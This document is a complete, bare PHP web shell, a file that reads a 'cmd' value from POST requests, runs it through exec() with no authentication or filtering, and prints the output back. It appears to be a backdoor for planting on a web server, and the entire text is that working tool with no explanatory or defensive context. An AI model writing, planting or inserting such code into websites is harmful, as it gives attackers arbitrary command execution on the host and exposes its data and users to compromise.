<?php
function execute($com)
{
	if (!empty($com))
	{
		exec($com,$arr);
		echo implode('',$arr);
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>